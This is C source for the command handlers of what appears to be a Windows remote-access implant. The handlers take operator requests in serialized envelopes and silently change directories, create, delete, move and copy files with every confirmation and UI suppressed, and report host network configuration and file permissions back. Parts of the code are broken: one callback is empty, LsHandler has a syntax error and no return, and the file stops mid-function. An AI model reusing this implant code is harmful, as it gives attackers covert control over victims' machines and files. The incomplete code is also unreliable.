#include "pch.h"

PENVELOPE CdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	LPSTR lpNewPath = NULL;
	DWORD dwReturnedLength = 0;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpNewPath = DuplicateStrA(pTemp[0]->pBuffer, 2);
	if (lpNewPath[lstrlenA(lpNewPath) - 1] != '\\') {
		lstrcatA(lpNewPath, "\\");
	}

	if (!SetCurrentDirectoryA(lpNewPath)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SetCurrentDirectoryA failed at %s", __FUNCTION__);
		goto CLEANUP;
	}
	
	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpNewPath != NULL) {
		FREE(lpNewPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE MkdirHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	DWORD dwReturnedLength = 0;
	LPWSTR lpPath = NULL;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	lpPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (lpPath[lstrlenW(lpPath) - 1] == L'\\') {
		lpPath[lstrlenW(lpPath) - 1] = L'\0';
	}

	if (!SHCreateDirectory(NULL, lpPath)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHCreateDirectory failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

PENVELOPE RmHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[3];
	PPBElement RespElement;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	BOOL Force = FALSE;
	BOOL Recursive = FALSE;
	LPWSTR lpConvertedPath = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Varint;
	Element[2]->Type = Varint;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpConvertedPath = ConvertCharToWchar(pTemp[0]->pBuffer);
	if (pTemp[1] != 0) {
		Recursive = TRUE;
	}

	if (pTemp[2] != 0) {
		Force = TRUE;
	}

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_DELETE;
	ShFileStruct.pFrom = DuplicateStrW(lpConvertedPath, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	lpRespData = DuplicateStrA(pTemp[0]->pBuffer, 0);
	RespElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;
	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FREE(pTemp);
	}

	if (lpConvertedPath != NULL) {
		FREE(lpConvertedPath);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);
	return pRespEnvelope;
}

PENVELOPE MvHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_MOVE;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	return pRespEnvelope;
}

PENVELOPE CpHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement Element[2];
	PPBElement RespElementList[3];
	PPBElement RespElement = NULL;
	PBUFFER* pTemp = NULL;
	PENVELOPE pRespEnvelope = NULL;
	DWORD i = 0;
	LPWSTR lpSrc = NULL;
	LPWSTR lpDest = NULL;
	SHFILEOPSTRUCTW ShFileStruct;
	LPSTR lpErrorDesc = NULL;

	for (i = 0; i < _countof(Element); i++) {
		Element[i] = ALLOC(sizeof(PBElement));
		Element[i]->dwFieldIdx = i + 1;
	}

	Element[0]->Type = Bytes;
	Element[1]->Type = Bytes;
	pTemp = UnmarshalStruct(Element, _countof(Element), pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	lpSrc = ConvertCharToWchar(pTemp[0]->pBuffer);
	lpDest = ConvertCharToWchar(pTemp[1]->pBuffer);

	SecureZeroMemory(&ShFileStruct, sizeof(ShFileStruct));
	ShFileStruct.wFunc = FO_COPY;
	ShFileStruct.pFrom = DuplicateStrW(lpSrc, 2);
	ShFileStruct.pTo = DuplicateStrW(lpDest, 2);
	ShFileStruct.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_NO_UI | FOF_SILENT;
	if (SHFileOperationW(&ShFileStruct)) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "SHFileOperationW failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	RespElementList[0] = CreateBytesElement(pTemp[0]->pBuffer, lstrlenA(pTemp[0]->pBuffer), 1);
	RespElementList[1] = CreateBytesElement(pTemp[1]->pBuffer, lstrlenA(pTemp[1]->pBuffer), 2);
	RespElementList[2] = CreateVarIntElement(GetFileSizeByPath(lpSrc), 3);
	RespElement = CreateStructElement(RespElementList, _countof(RespElementList), 0);

	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = RespElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = RespElement->cbMarshalledData;

	RespElement->pMarshalledData = NULL;
	RespElement->cbMarshalledData = 0;
CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (ShFileStruct.pFrom != NULL) {
		FREE(ShFileStruct.pFrom);
	}

	if (ShFileStruct.pTo != NULL) {
		FREE(ShFileStruct.pTo);
	}

	if (pTemp != NULL) {
		FreeBuffer(pTemp[0]);
		FreeBuffer(pTemp[1]);
		FREE(pTemp);
	}

	if (lpSrc != NULL) {
		FREE(lpSrc);
	}

	if (lpDest != NULL) {
		FREE(lpDest);
	}

	for (i = 0; i < _countof(Element); i++) {
		FreeElement(Element[i]);
	}

	FreeElement(RespElement);

	return pRespEnvelope;
}

PENVELOPE PwdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwReturnedLength = 0;
	PENVELOPE pRespEnvelope = NULL;

	lpRespData = ALLOC(MAX_PATH);
	dwReturnedLength = GetCurrentDirectoryA(MAX_PATH, lpRespData);
	if (lstrlenA(lpRespData) == 0) {
		lpRespData = REALLOC(lpRespData, dwReturnedLength);
		GetCurrentDirectoryA(dwReturnedLength, lpRespData);
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	FreeElement(pElement);

	return pRespEnvelope;
}

LPSTR SocketAddressToStr
(
	_In_ LPSOCKADDR lpSockAddr
)
{
	LPWSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	DWORD cbTemp = 0x100;
	NTSTATUS Status = STATUS_SUCCESS;

	LPSOCKADDR_IN6 SockIp6 = NULL;
	LPSOCKADDR_IN SockIp = NULL;
	if (lpSockAddr->sa_family == AF_INET) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp = (LPSOCKADDR_IN)(lpSockAddr);
		Status = RtlIpv4AddressToStringExW(&SockIp->sin_addr, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else if (lpSockAddr->sa_family == AF_INET6) {
		lpTemp = ALLOC(cbTemp * sizeof(WCHAR));
		SockIp6 = (LPSOCKADDR_IN6)(lpSockAddr);
		Status = RtlIpv6AddressToStringExW(&SockIp6->sin6_addr, SockIp6->sin6_scope_id, 0, lpTemp, &cbTemp);
		if (Status != STATUS_SUCCESS) {
			FREE(lpTemp);
			return NULL;
		}

		lpResult = ConvertWcharToChar(lpTemp);
		FREE(lpTemp);
		return lpResult;
	}
	else {
		return NULL;
	}
}

PENVELOPE IfconfigHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PIP_ADAPTER_ADDRESSES pAdapterInfo = NULL;
	PIP_ADAPTER_ADDRESSES pTemp = NULL;
	DWORD cbAdapterInfo = sizeof(IP_ADAPTER_ADDRESSES);
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD i = 0;
	CHAR szTempBuffer[0x200];
	LPSTR lpUnicastAddr = NULL;
	LPSTR lpGateWayAddr = NULL;
	LPSTR lpDhcpServer = NULL;
	LPSTR lpDnsServerAddr = NULL;
	PIP_ADAPTER_UNICAST_ADDRESS_LH pAdapterUnicastAddr = NULL;
	PIP_ADAPTER_GATEWAY_ADDRESS_LH pGateWayAddr = NULL;
	PIP_ADAPTER_DNS_SERVER_ADDRESS_XP pDnsServerAddr = NULL;
	ULONG uMask = 0;
	LPSTR lpHostName = NULL;
	LPSTR lpPrimaryDnsSuffix = NULL;
	LPSTR lpErrorDesc = NULL;
	PENVELOPE pRespEnvelope = NULL;
	PFIXED_INFO pFixedInfo = NULL;
	DWORD cbFixedInfo = sizeof(FIXED_INFO);
	DWORD dwLastError = 0;
	LPSTR lpNodeType = NULL;
	LPSTR lpRespData = NULL;
	LPSTR lpTempStr = NULL;
	PPBElement pElement = NULL;

	lpHostName = GetHostName();
	if (lpHostName == NULL) {
		lpErrorDesc = CreateFormattedErr(GetLastError(), "GetHostName() failed at %s", __FUNCTION__);
		goto CLEANUP;
	}

	lpPrimaryDnsSuffix = GetPrimaryDnsSuffix();
	pFixedInfo = ALLOC(cbFixedInfo);
	while (TRUE) {
		dwLastError = GetNetworkParams(pFixedInfo, &cbFixedInfo);
		if (dwLastError == ERROR_SUCCESS) {
			break;
		}
		else if (dwLastError == ERROR_BUFFER_OVERFLOW) {
			pFixedInfo = REALLOC(pFixedInfo, cbFixedInfo);
		}
		else {
			FREE(pFixedInfo);
			pFixedInfo = NULL;
			break;
		}
	}

	if (pFixedInfo->NodeType == BROADCAST_NODETYPE) {
		lpNodeType = DuplicateStrA("Broadcast", 0);
	}
	else if (pFixedInfo->NodeType == PEER_TO_PEER_NODETYPE) {
		lpNodeType = DuplicateStrA("Peer to peer", 0);
	}
	else if (pFixedInfo->NodeType == MIXED_NODETYPE) {
		lpNodeType = DuplicateStrA("Mixed", 0);
	}
	else if (pFixedInfo->NodeType == HYBRID_NODETYPE) {
		lpNodeType = DuplicateStrA("Hybrid", 0);
	}

	pAdapterInfo = ALLOC(cbAdapterInfo);
	pTemp = pAdapterInfo;
	dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
	if (dwErrorCode == ERROR_BUFFER_OVERFLOW) {
		pAdapterInfo = REALLOC(pAdapterInfo, cbAdapterInfo);
		pTemp = pAdapterInfo;
		dwErrorCode = GetAdaptersAddresses(0, GAA_FLAG_INCLUDE_GATEWAYS | GAA_FLAG_INCLUDE_WINS_INFO | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST, NULL, pAdapterInfo, &cbAdapterInfo);
		if (dwErrorCode != ERROR_SUCCESS) {
			lpErrorDesc = CreateFormattedErr(GetLastError(), "GetAdaptersAddresses() failed at %s", __FUNCTION__);
			goto CLEANUP;
		}
	}

	lpRespData = ALLOC(0x2000);
	lpRespData = StrCatExA(lpRespData, "\nWindows IP Configuration\n\n   Host Name . . . . . . . . . . . . : ");
	lpRespData = StrCatExA(lpRespData, lpHostName);
	lpRespData = StrCatExA(lpRespData, "\n   Primary Dns Suffix  . . . . . . . : ");
	if (lpPrimaryDnsSuffix != NULL) {
		lpRespData = StrCatExA(lpRespData, lpPrimaryDnsSuffix);
	}

	lpRespData = StrCatExA(lpRespData, "\n   Node Type . . . . . . . . . . . . : ");
	if (lpNodeType != NULL) {
		lpRespData = StrCatExA(lpRespData, lpNodeType);
	}

	lpRespData = StrCatExA(lpRespData, "\n   IP Routing Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableRouting) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	lpRespData = StrCatExA(lpRespData, "\n   WINS Proxy Enabled. . . . . . . . : ");
	if (pFixedInfo->EnableProxy) {
		lpRespData = StrCatExA(lpRespData, "yes");
	}
	else {
		lpRespData = StrCatExA(lpRespData, "no");
	}

	while (TRUE) {
		if (pAdapterInfo == NULL) {
			break;
		}

		if (pAdapterInfo->IfType == IF_TYPE_SOFTWARE_LOOPBACK) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n\n");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->FriendlyName);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, ":\n\n   Connection-specific DNS Suffix  . : ");
		if (pAdapterInfo->DnsSuffix != NULL && lstrlenW(pAdapterInfo->DnsSuffix) > 0) {
			lpTempStr = ConvertWcharToChar(pAdapterInfo->DnsSuffix);
			lpRespData = StrCatExA(lpRespData, lpTempStr);
			FREE(lpTempStr);
		}

		lpRespData = StrCatExA(lpRespData, "\n   Description . . . . . . . . . . . : ");
		lpTempStr = ConvertWcharToChar(pAdapterInfo->Description);
		lpRespData = StrCatExA(lpRespData, lpTempStr);
		FREE(lpTempStr);
		lpRespData = StrCatExA(lpRespData, "\n   Physical Address. . . . . . . . . : ");
		SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
		for (i = 0; i < pAdapterInfo->PhysicalAddressLength; i++) {
			sprintf_s(&szTempBuffer[i * 3], _countof(szTempBuffer), "%02X-", pAdapterInfo->PhysicalAddress[i]);
		}

		szTempBuffer[lstrlenA(szTempBuffer) - 1] = '\0';
		lpRespData = StrCatExA(lpRespData, szTempBuffer);
		lpRespData = StrCatExA(lpRespData, "\n   DHCP Enabled. . . . . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_DHCP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		lpRespData = StrCatExA(lpRespData, "\n   Autoconfiguration Enabled . . . . : yes");
		if (pAdapterInfo->OperStatus == IfOperStatusDown) {
			pAdapterInfo = pAdapterInfo->Next;
			continue;
		}

		lpRespData = StrCatExA(lpRespData, "\n   IP Address. . . . . . . . . . . . : ");
		pAdapterUnicastAddr = pAdapterInfo->FirstUnicastAddress;
		while (TRUE) {
			if (pAdapterUnicastAddr == NULL || pAdapterUnicastAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pAdapterUnicastAddr->DadState < NldsDeprecated) {
				pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
				continue;
			}

			if (pAdapterUnicastAddr != pAdapterInfo->FirstUnicastAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpUnicastAddr = SocketAddressToStr(pAdapterUnicastAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpUnicastAddr);
			FREE(lpUnicastAddr);

			if (pAdapterUnicastAddr->Address.lpSockaddr->sa_family == AF_INET) {
				if (ConvertLengthToIpv4Mask(pAdapterUnicastAddr->OnLinkPrefixLength, &uMask) == STATUS_SUCCESS) {
					SecureZeroMemory(szTempBuffer, sizeof(szTempBuffer));
					sprintf_s(szTempBuffer, _countof(szTempBuffer), "/%d", uMask);
				}
			}

			pAdapterUnicastAddr = pAdapterUnicastAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   Default Gateway . . . . . . . . . : ");
		pGateWayAddr = pAdapterInfo->FirstGatewayAddress;
		while (TRUE) {
			if (pGateWayAddr == NULL || pGateWayAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pGateWayAddr != pAdapterInfo->FirstGatewayAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpGateWayAddr = SocketAddressToStr(pGateWayAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpGateWayAddr);
			FREE(lpGateWayAddr);
			pGateWayAddr = pGateWayAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   DHCP Server . . . . . . . . . . . : ");
		if (pAdapterInfo->Dhcpv4Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv4Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}
		else if (pAdapterInfo->Dhcpv6Server.lpSockaddr != NULL) {
			lpDhcpServer = SocketAddressToStr(pAdapterInfo->Dhcpv6Server.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDhcpServer);
		}

		lpRespData = StrCatExA(lpRespData, "\n   DNS Servers . . . . . . . . . . . : ");
		pDnsServerAddr = pAdapterInfo->FirstDnsServerAddress;
		while (TRUE) {
			if (pDnsServerAddr == NULL || pDnsServerAddr->Address.lpSockaddr == NULL) {
				break;
			}

			if (pDnsServerAddr != pAdapterInfo->FirstDnsServerAddress) {
				lpRespData = StrCatExA(lpRespData, "\n                                       ");
			}

			lpDnsServerAddr = SocketAddressToStr(pDnsServerAddr->Address.lpSockaddr);
			lpRespData = StrCatExA(lpRespData, lpDnsServerAddr);
			FREE(lpDnsServerAddr);
			pDnsServerAddr = pDnsServerAddr->Next;
		}

		lpRespData = StrCatExA(lpRespData, "\n   NetBIOS over Tcpip. . . . . . . . : ");
		if (pAdapterInfo->Flags & IP_ADAPTER_NETBIOS_OVER_TCPIP_ENABLED) {
			lpRespData = StrCatExA(lpRespData, "yes");
		}
		else {
			lpRespData = StrCatExA(lpRespData, "no");
		}

		pAdapterInfo = pAdapterInfo->Next;
	}

	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = ALLOC(sizeof(BUFFER));
	pRespEnvelope->pData->pBuffer = pElement->pMarshalledData;
	pRespEnvelope->pData->cbBuffer = pElement->cbMarshalledData;
	pElement->pMarshalledData = NULL;
	pElement->cbMarshalledData = 0;
CLEANUP:
	FreeElement(pElement);
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (pTemp != NULL) {
		FREE(pTemp);
	}

	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpPrimaryDnsSuffix != NULL) {
		FREE(lpPrimaryDnsSuffix);
	}

	if (pFixedInfo != NULL) {
		FREE(pFixedInfo);
	}

	if (lpNodeType != NULL) {
		FREE(lpNodeType);
	}

	if (lpDhcpServer != NULL) {
		FREE(lpDhcpServer);
	}

	if (lpRespData != NULL) {
		FREE(lpRespData);
	}

	return pRespEnvelope;
}

BOOL LsHandlerCallback
(
	_In_ LPWSTR lpPath,
	_In_ LPVOID lpArgs
)
{

}

PENVELOPE LsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	LPWSTR lpConvertedPath = NULL;
	LPSTR lpFileName = NULL;
	LPSTR lpErrorDesc = NULL;
	PENVELOPE pRespEnvelope = NULL;
	BOOL IsFile = FALSE;
	DWORD dwNumberOfItems = 0;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpConvertedPath = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpConvertedPath)) {
		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
		goto CLEANUP;
	}

	if (IsFileExist(lpConvertedPath)) {
		
	}
	else {
		dwNumberOfItems = GetChildItemCount(lpConvertedPath);
		ListFileEx(lpConvertedPath, 0, );
	}

CLEANUP:
	if (lpErrorDesc != NULL) {
		pRespEnvelope = CreateErrorRespEnvelope(lpErrorDesc, 9, pEnvelope->uID);
		FREE(lpErrorDesc);
	}

	if (UnmarshalledData != NULL) {
		FreeBuffer(UnmarshalledData[0]);
		FREE(UnmarshalledData);
	}

	if (lpPath != NULL) {
		FREE(lpPath);
	}

	FreeElement(pRecvElement);
}

PENVELOPE IcaclsHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pRecvElement = NULL;
	PBUFFER* UnmarshalledData = NULL;
	LPSTR lpPath = NULL;
	LPWSTR lpTempPath = NULL;
	LPSTR lpErrorDesc = NULL;
	PENVELOPE pRespEnvelope = NULL;
	PACL pAcl = NULL;
	PACE_HEADER pAceHdr = NULL;
	DWORD i = 0;
	PSID pSid = NULL;
	LPSTR lpSidName = NULL;
	LPSTR lpRespData = NULL;
	DWORD dwMask = 0;
	PPBElement pFinalElement = NULL;

	pRecvElement = ALLOC(sizeof(PBElement));
	pRecvElement->Type = Bytes;
	pRecvElement->dwFieldIdx = 1;

	UnmarshalledData = UnmarshalStruct(&pRecvElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, NULL);
	if (UnmarshalledData[0] == NULL) {
		goto CLEANUP;
	}

	lpPath = DuplicateStrA(UnmarshalledData[0]->pBuffer, 0);
	lpTempPath = ConvertCharToWchar(lpPath);
	if (!IsPathExist(lpTempPath)) {
		lpErrorDesc = CreateFormattedErr(0, "%s is not exist", lpPath);
		goto CLEANUP;
	}

	pAcl = GetFileDacl(lpTempPath);
	pAceHdr = (PACE_HEADER)(&pAcl[1]);
	for (i = 0; i < pAcl->AceCount; i++) {
		pSid = (PSID)((ULONG_PTR)pAceHdr + 8);
		if (IsValidSid(pSid)) {
			lpSidName = LookupNameOfSid(pSid, TRUE);
			if (lpSidName != NULL) {
				lpRespData = StrCatExA(lpRespData, lpSidName);
				lpRespData = StrCatExA(lpRespData, ":");
			}
		}

		if (pAceHdr->AceFlags & INHERITED_ACE) {
			lpRespData = StrCatExA(lpRespData, "(I)");
		}

		if (pAceHdr->AceFlags & OBJECT_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(OI)");
		}

		if (pAceHdr->AceFlags & CONTAINER_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(CI)");
		}

		if (pAceHdr->AceFlags & NO_PROPAGATE_INHERIT_ACE) {
			lpRespData = StrCatExA(lpRespData, "(NP)");
		}

		if (pAceHdr->AceFlags & INHERIT_ONLY_ACE) {
			lpRespData = StrCatExA(lpRespData, "(IO)");
		}

		if (pAceHdr->AceFlags & CRITICAL_ACE_FLAG) {
			lpRespData = StrCatExA(lpRespData, "(CR)");
		}

		dwMask = *(PDWORD)((ULONG_PTR)pAceHdr + sizeof(ACE_HEADER));
		if (pAceHdr->AceType == ACCESS_DENIED_ACE_TYPE) {
			dwMask |= SYNCHRONIZE;
		}

		lpRespData = StrCatExA(lpRespData, "(");
